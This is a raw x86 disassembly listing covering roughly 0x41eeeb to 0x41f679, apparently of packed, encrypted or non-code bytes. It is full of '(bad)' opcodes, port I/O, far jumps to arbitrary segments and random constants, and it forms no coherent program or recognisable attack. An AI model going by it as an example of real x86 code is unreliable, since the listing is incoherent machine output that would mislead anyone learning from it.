  41eeeb:	xor    DWORD PTR [ebx+0x143178e4],esp
  41eef1:	fsub   QWORD PTR [eax+0x2d8dad9d]
  41eef7:	gs iret 
  41eef9:	sbb    edx,DWORD PTR [ebp-0x4c50a23a]
  41eeff:	push   esi
  41ef00:	out    0x28,eax
  41ef02:	pop    ebx
  41ef03:	std    
  41ef04:	xlat   BYTE PTR ds:[ebx]
  41ef05:	stc    
  41ef06:	sbb    DWORD PTR [ecx+esi*2-0x5b24aaf5],ebp
  41ef0d:	aam    0x9d
  41ef0f:	out    0x30,al
  41ef11:	sbb    esi,esi
  41ef13:	popf   
  41ef14:	out    dx,al
  41ef15:	jb     0x41ef17
  41ef17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef18:	dec    ebx
  41ef19:	mov    cl,0xbb
  41ef1b:	lds    eax,FWORD PTR [ebx+0x5f606d5e]
  41ef21:	sub    ch,BYTE PTR [edx-0x4ad4dfc6]
  41ef27:	mov    cl,0x53
  41ef29:	and    BYTE PTR [eax],0x12
  41ef2c:	mov    ?,WORD PTR [eax-0x25]
  41ef2f:	cmc    
  41ef30:	out    0xa9,al
  41ef32:	mov    edx,0xb3686259
  41ef37:	sbb    eax,0x7c42eb35
  41ef3c:	pop    eax
  41ef3d:	test   esp,esi
  41ef3f:	loopne 0x41ef83
  41ef41:	fidiv  DWORD PTR [esi-0x10]
  41ef44:	rol    al,0x6e
  41ef47:	stos   DWORD PTR es:[edi],eax
  41ef48:	xor    BYTE PTR [esi-0x4e055fa1],ch
  41ef4e:	test   ecx,edx
  41ef50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef51:	sbb    ah,BYTE PTR [eax]
  41ef53:	ret    0x535a
  41ef56:	shl    BYTE PTR [eax-0x487d1d70],cl
  41ef5c:	in     eax,dx
  41ef5d:	ret    
  41ef5e:	call   0x5dd7:0xcf1097fe
  41ef65:	in     al,0x2f
  41ef67:	fadd   st(5),st
  41ef69:	pop    es
  41ef6a:	call   0x1401:0x1d83d3c7
  41ef71:	pusha  
  41ef72:	xlat   BYTE PTR ds:[ebx]
  41ef73:	ss push eax
  41ef75:	mov    esi,0xf09822db
  41ef7a:	xchg   ebx,eax
  41ef7b:	addr16 push esp
  41ef7d:	mov    al,0xfc
  41ef7f:	adc    eax,0xaf0d0b1c
  41ef85:	div    BYTE PTR [esi-0x7]
  41ef88:	inc    edx
  41ef89:	rcl    bh,cl
  41ef8b:	pop    ebx
  41ef8c:	sub    DWORD PTR [esi-0x54],edi
  41ef8f:	(bad)  
  41ef90:	bound  ecx,QWORD PTR [ecx+edx*1]
  41ef93:	nop
  41ef94:	lahf   
  41ef95:	lahf   
  41ef96:	mov    ecx,0x60217da
  41ef9b:	xor    DWORD PTR [esi-0x5f],0x6fa85bcc
  41efa2:	jl     0x41ef85
  41efa4:	cmp    dh,bl
  41efa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efa8:	sbb    dl,dl
  41efaa:	push   ebp
  41efab:	repz dec ebp
  41efad:	mov    esp,0xcba52753
  41efb2:	jmp    0x962b:0x4f3b74c8
  41efb9:	fcomip st,st(3)
  41efbb:	lahf   
  41efbc:	outs   dx,DWORD PTR ds:[esi]
  41efbd:	leave  
  41efbe:	loope  0x41efcb
  41efc0:	mov    al,fs:0xe5442a31
  41efc6:	std    
  41efc7:	xor    DWORD PTR [ecx],ebx
  41efc9:	add    BYTE PTR [ecx-0x7bca1e87],al
  41efcf:	jmp    0x41ef6b
  41efd1:	(bad)  
  41efd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efd4:	push   edi
  41efd5:	lods   al,BYTE PTR ds:[esi]
  41efd6:	stc    
  41efd7:	scas   al,BYTE PTR es:[edi]
  41efd8:	mov    al,0x3e
  41efda:	mov    bl,dh
  41efdc:	(bad)
  41efe0:	inc    esi
  41efe1:	mov    ds:0x1e3ce98e,eax
  41efe6:	inc    eax
  41efe7:	push   edi
  41efe8:	sahf   
  41efe9:	jae    0x41efa6
  41efeb:	test   BYTE PTR [edx],dh
  41efed:	imul   ecx,DWORD PTR [eax+edx*2-0x10],0xffffffbd
  41eff2:	and    eax,0x8f64a3c6
  41eff7:	cmp    al,0x60
  41effa:	imul   BYTE PTR [edi-0x7ec4092a]
  41f000:	mov    al,0x5c
  41f002:	ffreep st(7)
  41f004:	shr    BYTE PTR [edx-0xc],1
  41f007:	jg     0x41f064
  41f009:	sub    al,0x22
  41f00b:	cwde   
  41f00c:	mov    al,ds:0xd7101bda
  41f011:	call   0xb770:0x20731277
  41f018:	fild   QWORD PTR [ebx+edx*2+0x3af115df]
  41f01f:	fsubr  st(2),st
  41f021:	(bad)  [esp+ecx*2-0x7c122c66]
  41f028:	inc    ebp
  41f029:	xor    dh,ch
  41f02b:	test   DWORD PTR [edi],edx
  41f02d:	stos   DWORD PTR es:[edi],eax
  41f02e:	dec    esp
  41f02f:	push   esp
  41f030:	rcl    BYTE PTR [ebp+0x538848f4],cl
  41f036:	pop    edx
  41f037:	xchg   edi,eax
  41f038:	lods   eax,DWORD PTR ds:[esi]
  41f039:	jge    0x41f06e
  41f03b:	(bad)  
  41f03c:	sbb    eax,0x26d31dac
  41f041:	push   0x23d71404
  41f046:	aaa    
  41f047:	sti    
  41f048:	fucomp st(4)
  41f04a:	adc    eax,0xec84844f
  41f04f:	not    al
  41f051:	mov    dh,0xe5
  41f053:	cmp    edx,eax
  41f055:	xchg   edx,eax
  41f056:	cs fs dec eax
  41f059:	outs   dx,BYTE PTR ds:[esi]
  41f05a:	mov    ds:0x335db6e7,eax
  41f05f:	retf   0xbd76
  41f062:	lods   eax,DWORD PTR ds:[esi]
  41f063:	adc    eax,0xffffffdb
  41f066:	jecxz  0x41f02e
  41f068:	inc    edx
  41f069:	mov    eax,ds:0xc3877f26
  41f06e:	or     eax,0xe80e002f
  41f073:	push   esi
  41f074:	ss sahf 
  41f076:	pop    esi
  41f077:	mov    ebx,0xf9805fce
  41f07c:	push   edx
  41f07d:	and    esi,eax
  41f07f:	dec    edx
  41f080:	pushf  
  41f081:	mov    dh,0x77
  41f083:	inc    edi
  41f084:	jmp    0xdf87:0x1e06048d
  41f08b:	mov    ebx,0xa93ccb2e
  41f090:	fimul  WORD PTR [edx]
  41f092:	ins    DWORD PTR es:[edi],dx
  41f093:	pusha  
  41f094:	in     al,dx
  41f095:	inc    esi
  41f096:	cmp    ebx,DWORD PTR [ebx+0x20]
  41f099:	add    esp,DWORD PTR [eax]
  41f09b:	js     0x41f087
  41f09d:	jno    0x41f0d0
  41f09f:	or     DWORD PTR [eax+eiz*8+0x997552a],ebp
  41f0a6:	sub    ch,BYTE PTR [edx-0x77]
  41f0a9:	js     0x41f0ab
  41f0ab:	adc    al,0xa7
  41f0ad:	pop    ebp
  41f0ae:	scas   eax,DWORD PTR es:[edi]
  41f0af:	or     ebx,DWORD PTR [ebx-0x222004d]
  41f0b5:	imul   BYTE PTR [edi]
  41f0b7:	dec    ebp
  41f0b8:	adc    BYTE PTR [esi+ecx*2-0x44],dl
  41f0bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0bd:	mov    al,ds:0x812f9ddf
  41f0c2:	lahf   
  41f0c3:	jmp    0x1cd91159
  41f0c8:	cmp    bl,BYTE PTR [ecx+0x49ebb351]
  41f0ce:	lea    esp,[ecx]
  41f0d0:	push   0xe8ff589e
  41f0d5:	push   es
  41f0d6:	aam    0x64
  41f0d8:	scas   al,BYTE PTR es:[edi]
  41f0d9:	xor    DWORD PTR [esi],0xffffffa2
  41f0dc:	mov    bh,0x4
  41f0de:	rcr    BYTE PTR [ebx+0x52478d13],1
  41f0e4:	mov    cl,0xa7
  41f0e6:	test   al,0xd7
  41f0e8:	sbb    BYTE PTR [ebx+0x3b1ea178],bh
  41f0ee:	pop    esi
  41f0ef:	popa   
  41f0f0:	movhps xmm1,QWORD PTR [edi]
  41f0f3:	(bad)  
  41f0f4:	cmp    al,0xdc
  41f0f6:	mov    ch,dl
  41f0f8:	jp     0x41f103
  41f0fa:	loope  0x41f148
  41f0fc:	jp     0x41f152
  41f0fe:	fistp  QWORD PTR [esi+0x2e2157d6]
  41f104:	popa   
  41f105:	sbb    ch,BYTE PTR [ebp-0x32]
  41f108:	popa   
  41f109:	and    al,0x10
  41f10b:	and    cl,ah
  41f10d:	pop    ebx
  41f10e:	les    ebp,FWORD PTR [esi+ebx*4+0x94446cf]
  41f115:	fwait
  41f116:	jmp    FWORD PTR [eax+0x6efadc9f]
  41f11c:	jbe    0x41f18c
  41f11e:	xchg   ecx,eax
  41f11f:	stos   DWORD PTR es:[edi],eax
  41f120:	test   al,0xae
  41f122:	js     0x41f149
  41f124:	mov    esi,0xdf9dcac9
  41f129:	cmp    esp,DWORD PTR [ebx]
  41f12b:	daa    
  41f12c:	stos   DWORD PTR es:[edi],eax
  41f12d:	test   al,0x7c
  41f12f:	ds xchg ecx,eax
  41f131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f132:	sub    cl,ah
  41f134:	es mov ecx,0x294c7a8
  41f13a:	pop    ds
  41f13b:	test   al,0xd6
  41f13d:	fst    DWORD PTR [edi+0x22]
  41f140:	or     BYTE PTR [edi-0x9],dl
  41f143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f144:	cld    
  41f145:	inc    ecx
  41f146:	out    dx,al
  41f147:	mov    bl,BYTE PTR [ebx]
  41f149:	cwde   
  41f14a:	ins    BYTE PTR es:[edi],dx
  41f14b:	push   ds
  41f14c:	xchg   ecx,eax
  41f14d:	xchg   edi,eax
  41f14e:	inc    ebp
  41f14f:	in     eax,dx
  41f150:	fs sbb esi,esi
  41f153:	mov    esi,0x54ab9dae
  41f158:	stc    
  41f159:	push   esp
  41f15a:	push   eax
  41f15b:	(bad)  
  41f15c:	inc    DWORD PTR [edx]
  41f15e:	mov    al,ds:0x5f9204a8
  41f163:	pop    esp
  41f164:	test   DWORD PTR [edx+0xc1568fb],esp
  41f16a:	in     eax,0xd5
  41f16c:	es xchg ecx,eax
  41f16e:	pusha  
  41f16f:	repz push esp
  41f171:	test   eax,0x59b68e1
  41f176:	dec    eax
  41f177:	adc    eax,DWORD PTR [ecx+0x4be4dded]
  41f17d:	or     cl,al
  41f17f:	mov    cl,0xf3
  41f181:	add    ch,BYTE PTR [esi-0xd]
  41f184:	fcomp  DWORD PTR [esi]
  41f186:	rcl    edx,cl
  41f188:	jle    0x41f16a
  41f18a:	mov    cs,WORD PTR [edx-0x6a]
  41f18d:	push   edi
  41f18e:	push   ss
  41f18f:	xchg   ecx,eax
  41f190:	pop    ebp
  41f191:	imul   ebx,DWORD PTR [ebx+0x29],0xffffff85
  41f195:	xor    dh,BYTE PTR [ecx+0x36]
  41f198:	push   esp
  41f199:	test   BYTE PTR [ebp+0x4816378],bl
  41f19f:	mov    WORD PTR [ebp+0x7830cdb9],ds
  41f1a5:	adc    ebx,DWORD PTR [ecx+0x48a6aa76]
  41f1ab:	pop    esp
  41f1ac:	and    eax,0x1f50461b
  41f1b1:	mov    edx,0xbe8099ab
  41f1b6:	mov    ebp,0x42865835
  41f1bb:	stos   DWORD PTR es:[edi],eax
  41f1bc:	adc    BYTE PTR [edi-0x32],dl
  41f1bf:	ja     0x41f1f6
  41f1c1:	cdq    
  41f1c2:	les    edx,FWORD PTR [edi*8+0x52bc40c]
  41f1c9:	or     BYTE PTR [esi],dh
  41f1cb:	and    BYTE PTR [ebx+eax*1-0x6c],al
  41f1cf:	ins    BYTE PTR es:[edi],dx
  41f1d0:	stc    
  41f1d1:	rcr    dl,0x47
  41f1d4:	and    dh,0x5e
  41f1d7:	fisub  WORD PTR [edi-0x7f]
  41f1da:	(bad)  
  41f1db:	aas    
  41f1dc:	pop    ss
  41f1dd:	jae    0x41f18b
  41f1df:	test   BYTE PTR [edx],ah
  41f1e1:	leave  
  41f1e2:	pop    es
  41f1e3:	mov    edx,0x6e3d3404
  41f1e8:	dec    esi
  41f1e9:	fiadd  DWORD PTR [ebp+0x2c16e5f7]
  41f1ef:	jmp    0x7786bb91
  41f1f4:	dec    eax
  41f1f5:	xlat   BYTE PTR ds:[ebx]
  41f1f6:	mov    ds:0xafffaf46,al
  41f1fb:	jno    0x41f247
  41f1fd:	push   0x98eadfb6
  41f202:	mov    edi,0x83caadde
  41f207:	mov    edi,0xac8be946
  41f20c:	call   edi
  41f20e:	inc    ebp
  41f20f:	jnp    0x41f214
  41f211:	fs call 0xb950:0x25142e5a
  41f219:	dec    edx
  41f21a:	cld    
  41f21b:	sub    al,0x71
  41f21d:	into   
  41f21e:	mul    BYTE PTR [edx+0x7a]
  41f221:	mov    al,ds:0x38a19935
  41f226:	jge    0x41f266
  41f228:	mov    ebp,0x6736a25b
  41f22d:	ds xor eax,ecx
  41f230:	stos   DWORD PTR es:[edi],eax
  41f231:	xlat   BYTE PTR ds:[ebx]
  41f232:	gs (bad) 
  41f234:	push   esi
  41f235:	retf   0x1f77
  41f238:	pop    ss
  41f239:	mov    ebx,0x15ea4a5b
  41f23e:	and    eax,0x67d916e2
  41f243:	cld    
  41f244:	sub    al,0xb1
  41f246:	aam    0x21
  41f248:	retf   
  41f249:	mov    ecx,0x45322583
  41f24e:	push   ds
  41f24f:	imul   ebx,ebp,0x49
  41f252:	sub    DWORD PTR [esi-0x45c3a0],0x5ae8cde9
  41f25c:	jge    0x41f26f
  41f25e:	ins    DWORD PTR es:[edi],dx
  41f25f:	(bad)  
  41f260:	xlat   BYTE PTR cs:[ebx]
  41f262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f263:	(bad)  
  41f265:	iret   
  41f266:	sbb    DWORD PTR [edx],ebx
  41f268:	inc    ebx
  41f269:	mov    ah,0xfd
  41f26b:	dec    ecx
  41f26c:	mov    eax,ds:0x38b946d7
  41f271:	jmp    0xea5c:0xcacccf6c
  41f278:	fcomp  DWORD PTR [eax+0x21ba85e3]
  41f27e:	ret    0x6799
  41f281:	push   esp
  41f282:	sbb    dh,ah
  41f284:	sbb    BYTE PTR [eax-0x22],ch
  41f287:	call   0x5e9b7c4a
  41f28c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f28d:	mov    DWORD PTR [eax],esi
  41f28f:	rcl    esp,cl
  41f291:	outs   dx,BYTE PTR ds:[esi]
  41f292:	mov    ss,WORD PTR [eax]
  41f294:	cmp    eax,DWORD PTR [edi]
  41f296:	clc    
  41f297:	aam    0x91
  41f299:	call   0xbee45ff4
  41f29e:	mov    bl,0xd0
  41f2a0:	mov    DWORD PTR [edi],esi
  41f2a2:	sub    eax,esi
  41f2a4:	jmp    0x41f243
  41f2a6:	mov    ebp,DWORD PTR [eax]
  41f2a8:	aad    0xfc
  41f2aa:	nop
  41f2ab:	cmp    al,0x2e
  41f2ad:	mov    WORD PTR [ecx-0x50],gs
  41f2b0:	pop    ebp
  41f2b1:	mov    BYTE PTR [esi-0x3d],al
  41f2b4:	mov    ecx,0x4a9b1cc3
  41f2b9:	jmp    0x8e41:0x7e0de863
  41f2c0:	int3   
  41f2c1:	jae    0x41f2d5
  41f2c3:	es loopne 0x41f294
  41f2c6:	shl    esi,0x44
  41f2c9:	movups xmm6,xmm3
  41f2cc:	mov    bh,0x49
  41f2ce:	int3   
  41f2cf:	das    
  41f2d0:	loop   0x41f295
  41f2d2:	daa    
  41f2d3:	repnz gs daa 
  41f2d6:	mov    esi,0x820d71bd
  41f2db:	xor    esp,DWORD PTR fs:[ebx-0x3a]
  41f2df:	push   ds
  41f2e0:	add    bl,BYTE PTR [esi+0x65a45433]
  41f2e6:	pop    edx
  41f2e7:	sbb    eax,0x8fed69ab
  41f2ec:	sub    dh,BYTE PTR [esi]
  41f2ee:	mov    eax,0xc357d820
  41f2f3:	push   0xffffff9b
  41f2f5:	add    BYTE PTR [edi-0x6d],bl
  41f2f8:	ins    DWORD PTR es:[edi],dx
  41f2f9:	pop    esp
  41f2fa:	iret   
  41f2fb:	(bad)  
  41f2fc:	lahf   
  41f2fd:	retf   0x100e
  41f300:	and    BYTE PTR [esi+0x6696be97],0xd6
  41f307:	pop    ss
  41f308:	xor    DWORD PTR [esi],edi
  41f30a:	das    
  41f30b:	cmp    edi,DWORD PTR [edx-0x3c]
  41f30e:	leave  
  41f30f:	fadd   st(5),st
  41f311:	mov    ds:0x74d85866,al
  41f316:	dec    esp
  41f317:	jmp    0xc97b767b
  41f31c:	mov    ch,0x1e
  41f31e:	stos   BYTE PTR es:[edi],al
  41f31f:	sahf   
  41f320:	retf   0x5694
  41f323:	mov    al,ds:0x1ffd7a56
  41f328:	daa    
  41f329:	ret    0x7346
  41f32c:	inc    eax
  41f32d:	(bad)  
  41f32e:	dec    ebp
  41f32f:	mov    cl,0xb9
  41f331:	jb     0x41f2e2
  41f333:	push   esi
  41f334:	jecxz  0x41f382
  41f336:	jge    0x41f2c5
  41f338:	push   cs
  41f339:	clc    
  41f33a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f33b:	clc    
  41f33c:	fwait
  41f33d:	sti    
  41f33e:	int    0x63
  41f340:	lods   eax,DWORD PTR ds:[esi]
  41f341:	les    ebx,FWORD PTR [edx]
  41f343:	pop    esi
  41f344:	or     DWORD PTR [ecx-0x68],esp
  41f347:	cmp    edx,ebx
  41f349:	adc    eax,ebp
  41f34b:	xchg   ebx,eax
  41f34c:	stc    
  41f34d:	call   0xe601:0x1545ec40
  41f354:	add    BYTE PTR [edx+0x43ff0ade],bh
  41f35a:	fldl2t 
  41f35c:	pop    edx
  41f35d:	add    eax,0x1b334b5e
  41f362:	enter  0x3f6d,0xb9
  41f366:	mov    dh,BYTE PTR [edx]
  41f368:	jg     0x41f368
  41f36a:	and    ecx,DWORD PTR [edi]
  41f36c:	outs   dx,DWORD PTR ds:[esi]
  41f36d:	mov    esp,DWORD PTR [esi-0xbf6fb1c]
  41f373:	mov    fs:0xf4dc6a79,al
  41f379:	jno    0x41f3d3
  41f37b:	add    al,dh
  41f37d:	push   edi
  41f37e:	jo     0x41f307
  41f380:	cmp    edx,DWORD PTR [ebx+0x3e394fbf]
  41f386:	call   0x633c:0x98ce20f5
  41f38d:	les    edi,FWORD PTR [esi+0x4d2fe4cb]
  41f393:	xchg   ecx,eax
  41f394:	imul   sp,WORD PTR ds:[ebp-0x33018c35],0xea29
  41f39e:	dec    ecx
  41f39f:	inc    esi
  41f3a0:	aam    0x8
  41f3a2:	fcmovne st,st(6)
  41f3a4:	addr16 pop edx
  41f3a6:	pop    ss
  41f3a7:	ja     0x41f363
  41f3a9:	dec    esi
  41f3aa:	vpsadbw xmm5,xmm5,xmm7
  41f3ae:	xchg   esp,eax
  41f3af:	into   
  41f3b0:	jb     0x41f334
  41f3b2:	mov    ebx,DWORD PTR [edx-0xf]
  41f3b5:	iret   
  41f3b6:	pushf  
  41f3b7:	or     al,0x61
  41f3b9:	mov    ah,0x7d
  41f3bb:	leave  
  41f3bc:	(bad)  
  41f3bd:	cs add al,bh
  41f3c0:	dec    esi
  41f3c1:	popa   
  41f3c2:	iret   
  41f3c3:	test   BYTE PTR [ebx-0xd],ch
  41f3c6:	lods   eax,DWORD PTR ds:[esi]
  41f3c7:	dec    edi
  41f3c8:	jmp    0xa02abe4
  41f3cd:	lahf   
  41f3ce:	xor    eax,0xf2620fdd
  41f3d3:	not    BYTE PTR [ebx]
  41f3d5:	call   0x2d0eaa2f
  41f3da:	imul   esp,DWORD PTR [esi-0x36164648],0xffffff9d
  41f3e1:	fcmovnbe st,st(7)
  41f3e3:	mov    cl,0x79
  41f3e5:	sbb    al,0x8f
  41f3e7:	sbb    BYTE PTR [ecx],bh
  41f3e9:	xchg   edx,eax
  41f3ea:	loope  0x41f370
  41f3ec:	jmp    0x41f415
  41f3ee:	fcom   DWORD PTR [esi]
  41f3f0:	inc    ebx
  41f3f1:	lods   eax,DWORD PTR ds:[esi]
  41f3f3:	cmp    eax,0x48837ff0
  41f3f8:	inc    eax
  41f3f9:	out    dx,eax
  41f3fa:	push   esp
  41f3fb:	jno    0x41f461
  41f3fd:	test   al,0x9b
  41f3ff:	adc    bl,cl
  41f401:	leave  
  41f402:	cmp    al,0x6a
  41f404:	jae    0x41f45b
  41f406:	push   0xffffffcb
  41f408:	(bad)  
  41f409:	ins    DWORD PTR es:[edi],dx
  41f40a:	push   ecx
  41f40b:	dec    esp
  41f40c:	int    0xdc
  41f40e:	imul   edi,DWORD PTR [ebp-0x5ad24eca],0xffffffde
  41f415:	or     cl,BYTE PTR [edx+edx*4]
  41f418:	aam    0xf3
  41f41a:	fcomp  QWORD PTR [eax+0x31]
  41f41d:	(bad)  
  41f41e:	jnp    0x41f424
  41f420:	or     eax,0xfe0662e7
  41f425:	fmul   QWORD PTR [esi-0x5e]
  41f428:	cmp    BYTE PTR [ebx-0x72],bl
  41f42b:	jo     0x41f48d
  41f42d:	mov    cl,0x3a
  41f42f:	adc    dl,BYTE PTR [ebp+esi*1-0x53]
  41f433:	pop    es
  41f434:	ret    
  41f435:	loopne 0x41f469
  41f437:	adc    eax,0x7d1be938
  41f43c:	shr    DWORD PTR [eax],1
  41f43e:	repnz sbb eax,0x663c6878
  41f444:	mov    cl,0x24
  41f446:	add    al,BYTE PTR [edi+0x2c7db21]
  41f44c:	fadd   QWORD PTR [edx]
  41f44e:	adc    al,0xd1
  41f450:	adc    DWORD PTR [esi+ebp*2+0x1e098b93],esi
  41f457:	js     0x41f41b
  41f459:	(bad)  [edx-0x15]
  41f45c:	imul   ecx,DWORD PTR [ecx+0x1a46c248],0xac181931
  41f466:	test   DWORD PTR [ebx],edi
  41f468:	lds    ecx,FWORD PTR [edi]
  41f46a:	leave  
  41f46b:	mov    ecx,0x1b4cfb36
  41f470:	sbb    BYTE PTR [esi+0x41],ch
  41f473:	mov    ecx,0xc1bed5d
  41f478:	xor    al,0xbb
  41f47a:	push   cs
  41f47b:	or     ebx,edx
  41f47d:	fwait
  41f47e:	cwde   
  41f47f:	add    ebp,esp
  41f481:	sub    al,0xfb
  41f483:	and    eax,0x63fa28de
  41f488:	call   0x2cc:0x5a2b4566
  41f48f:	push   edx
  41f490:	xor    esi,DWORD PTR [esi-0x61ed7aae]
  41f496:	xchg   esi,eax
  41f497:	out    0xd5,al
  41f499:	lea    esi,[esi-0x65]
  41f49c:	push   eax
  41f49d:	add    ecx,DWORD PTR [edi+0x43]
  41f4a0:	dec    eax
  41f4a1:	adc    al,0x80
  41f4a3:	xchg   bh,ch
  41f4a5:	pop    ebp
  41f4a6:	pop    ebp
  41f4a7:	clc    
  41f4a8:	lds    ecx,FWORD PTR [ebx-0x6]
  41f4ab:	test   eax,0x6f2f5790
  41f4b0:	or     al,0x94
  41f4b2:	push   edi
  41f4b3:	dec    esp
  41f4b4:	js     0x41f51f
  41f4b6:	test   eax,eax
  41f4b8:	ror    DWORD PTR [ebp+0x5895f5d2],1
  41f4be:	imul   eax,DWORD PTR [eax+0x44],0xfffffffb
  41f4c2:	pop    esi
  41f4c3:	stos   BYTE PTR es:[edi],al
  41f4c4:	mov    ds:0x63752ea6,eax
  41f4c9:	hlt    
  41f4ca:	shl    ebp,1
  41f4cc:	(bad)  
  41f4cd:	shl    DWORD PTR [ebx],cl
  41f4cf:	pop    ebp
  41f4d0:	inc    edi
  41f4d1:	push   edx
  41f4d2:	int    0xf
  41f4d4:	jecxz  0x41f525
  41f4d6:	sbb    eax,0x1e40aa77
  41f4db:	inc    edi
  41f4dc:	mov    al,ds:0x3325378e
  41f4e1:	shl    BYTE PTR [ebx+0x5b715b74],1
  41f4e7:	xchg   edi,eax
  41f4e8:	and    ecx,DWORD PTR ds:0x278b5753
  41f4ee:	out    0x17,al
  41f4f0:	nop
  41f4f1:	lahf   
  41f4f2:	jge    0x41f554
  41f4f4:	mov    edx,0x38fc5d0a
  41f4f9:	mov    dh,0x66
  41f4fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4fc:	push   es
  41f4fd:	adc    al,0x4d
  41f4ff:	adc    ecx,DWORD PTR [edi-0x680c7d8d]
  41f505:	or     al,0x5c
  41f507:	ret    
  41f508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f509:	cli    
  41f50a:	cmp    DWORD PTR [edx],esi
  41f50c:	pop    ecx
  41f50d:	je     0x41f517
  41f50f:	dec    esi
  41f510:	fisttp WORD PTR [edi+0x86973ff]
  41f516:	imul   BYTE PTR [esi-0x50b2feb0]
  41f51c:	dec    eax
  41f51d:	pop    edi
  41f51e:	add    BYTE PTR [edx+eiz*2],dh
  41f521:	xor    al,0xcf
  41f523:	test   eax,0x82f1b5e1
  41f528:	test   al,0xcb
  41f52a:	setle  al
  41f52d:	out    dx,eax
  41f52e:	xor    ecx,ebp
  41f530:	test   BYTE PTR [edi-0x18521a16],dl
  41f536:	and    eax,0x182bda3f
  41f53b:	ins    BYTE PTR es:[edi],dx
  41f53c:	and    ax,0x7444
  41f540:	xchg   ebp,eax
  41f541:	inc    eax
  41f542:	test   al,0x60
  41f544:	mov    ch,0xb0
  41f546:	and    bl,BYTE PTR ds:0x467e21bb
  41f54c:	xor    BYTE PTR [edi-0x685ce3e3],bl
  41f552:	mov    ds:0x3740fe06,eax
  41f557:	sbb    DWORD PTR [esi-0x2013d382],eax
  41f55d:	lds    edi,FWORD PTR [ebx]
  41f55f:	test   DWORD PTR [edi+0x249248a0],ecx
  41f565:	pusha  
  41f566:	scas   al,BYTE PTR es:[edi]
  41f567:	dec    esp
  41f568:	jns    0x41f568
  41f56a:	dec    esp
  41f56b:	and    eax,0x56984906
  41f570:	mov    bh,0xaa
  41f572:	inc    esi
  41f573:	inc    ebp
  41f574:	test   DWORD PTR ds:0x3a04d6f8,ebx
  41f57a:	stos   DWORD PTR es:[edi],eax
  41f57b:	(bad)  
  41f57c:	dec    edx
  41f57d:	pop    ss
  41f57e:	repnz rcr BYTE PTR [ebx-0x34],0xb9
  41f583:	and    DWORD PTR [eax+eiz*2+0x7f],edi
  41f587:	mov    al,ds:0xaefa3e56
  41f58c:	fld    QWORD PTR [ecx-0x4c]
  41f58f:	hlt    
  41f590:	or     DWORD PTR [edx+0x7224203b],edi
  41f596:	jnp    0x41f5d9
  41f598:	call   0x40cb857
  41f59d:	mov    BYTE PTR [ebx],al
  41f59f:	scas   eax,DWORD PTR es:[edi]
  41f5a0:	dec    edi
  41f5a1:	cld    
  41f5a2:	jg     0x41f54c
  41f5a4:	ja     0x41f53b
  41f5a6:	vpminsw ymm4,ymm6,YMMWORD PTR [edi]
  41f5aa:	sbb    DWORD PTR [ecx-0x40ce1a75],ebp
  41f5b0:	(bad)  
  41f5b1:	adc    DWORD PTR [ecx-0x33],ecx
  41f5b4:	call   FWORD PTR [eax+0x10c191c7]
  41f5ba:	nop
  41f5bb:	in     eax,0xc
  41f5bd:	retf   0x1503
  41f5c0:	inc    edx
  41f5c1:	hlt    
  41f5c2:	enter  0xd731,0x2
  41f5c6:	stc    
  41f5c7:	jno    0x41f57d
  41f5c9:	arpl   WORD PTR [esp+ecx*2],si
  41f5cc:	mov    ah,0x94
  41f5ce:	loop   0x41f5b8
  41f5d0:	inc    ebx
  41f5d1:	mov    ah,0x22
  41f5d3:	add    esi,ebx
  41f5d5:	test   DWORD PTR [ecx+0x4e929cc9],edi
  41f5db:	add    ah,BYTE PTR [edx]
  41f5dd:	dec    esi
  41f5de:	xchg   edx,eax
  41f5df:	push   ebp
  41f5e0:	dec    edi
  41f5e1:	stos   DWORD PTR es:[edi],eax
  41f5e2:	mov    esp,0x38427be0
  41f5e7:	sbb    eax,0xbaf5e379
  41f5ec:	aaa    
  41f5ed:	outs   dx,DWORD PTR cs:[esi]
  41f5ef:	das    
  41f5f0:	ror    DWORD PTR ds:0x26ee07cd,0x38
  41f5f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5f8:	or     DWORD PTR [ebx+0x6],0x3abaf200
  41f5ff:	sahf   
  41f600:	sbb    al,0xf0
  41f602:	sbb    eax,DWORD PTR [edx-0x3a7ce15a]
  41f608:	mov    esi,0x9ca0092c
  41f60d:	inc    ebx
  41f60e:	pop    ebx
  41f60f:	ss je  0x41f63e
  41f612:	fsub   DWORD PTR [eax+0x55]
  41f615:	(bad)  
  41f616:	and    bl,BYTE PTR [ebx+0x5b23c2ff]
  41f61c:	xlat   BYTE PTR ds:[ebx]
  41f61d:	inc    ebp
  41f61e:	xor    ebx,esi
  41f620:	call   FWORD PTR [edi+eax*8-0x6105a509]
  41f627:	std    
  41f628:	mov    esp,0x97b07bd2
  41f62d:	ja     0x41f668
  41f62f:	ins    BYTE PTR es:[edi],dx
  41f630:	inc    edx
  41f631:	lock data16 stos BYTE PTR es:[edi],al
  41f634:	pop    ecx
  41f635:	sbb    eax,0x384dbe8e
  41f63a:	aad    0xb2
  41f63c:	and    eax,0x49b5946e
  41f641:	cmp    dl,BYTE PTR [ecx+0x5]
  41f644:	test   BYTE PTR [edx-0x48],al
  41f647:	dec    ebx
  41f648:	mov    BYTE PTR [esi+edi*8],bl
  41f64b:	test   DWORD PTR [edx+0xf],ebp
  41f64e:	call   0xde852b06
  41f653:	dec    edx
  41f654:	pop    ecx
  41f655:	xor    eax,0xb355fd28
  41f65b:	inc    edx
  41f65c:	inc    edi
  41f65d:	pop    esp
  41f65e:	xor    BYTE PTR [edx-0x5db9deca],bl
  41f664:	iret   
  41f665:	sbb    bh,BYTE PTR [edx-0x6d874d39]
  41f66b:	jne    0x41f635
  41f66d:	adc    al,0x12
  41f66f:	and    ah,BYTE PTR [edx+eiz*4]
  41f672:	aaa    
  41f673:	repnz mov edx,0x9484a6a1
  41f679:	mov    esp,eax
